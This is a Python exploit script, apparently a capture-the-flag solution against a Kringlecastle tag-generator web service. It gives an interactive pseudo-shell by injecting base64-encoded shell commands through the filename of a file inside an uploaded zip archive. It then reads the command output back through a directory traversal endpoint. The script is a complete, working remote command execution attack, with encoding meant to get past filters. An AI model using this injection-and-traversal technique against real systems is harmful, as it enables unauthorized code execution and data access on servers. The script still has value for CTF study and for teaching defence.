#!/usr/bin/env python3
import requests
from zipfile import ZipFile
from io import BytesIO
import base64

def make_payload(exploit):
    # create a zip file containing a dummy file with the exploit as filename
    mypayload = BytesIO()
    with ZipFile(mypayload, 'w') as zf:
        file_name = exploit
        zf.writestr(file_name, 'I am a dummy')
    mypayload.seek(0)   # reset byte stream to position 0
    return mypayload

url = "https://tag-generator.kringlecastle.com"
current_dir = "/tmp"

while True:
    # wait for input, showing current directory
    line = input(f"{current_dir}$ ").strip()
    if line.lower() == 'exit':
        break

    # base64 encode command to hide . and /
    b64 = base64.b64encode(f"cd {current_dir}; {line} >/tmp/kuraout 2>&1; pwd >/tmp/kurapwd".encode()).decode()
    payload = make_payload(f"';echo {b64} | base64 -d | sh #png")
    # generate the POST request carrying the payload
    requests.post(url + "/upload", files={'my_file[]': ("innocent.zip", payload)})
    # get the output through directory traversal exploit
    get_resp = requests.get(url + "/image?id=kuraout")
    print(get_resp.text)
    # retrieve the new current directory
    pwd_resp = requests.get(url + "/image?id=kurapwd")
    current_dir = pwd_resp.text.strip()




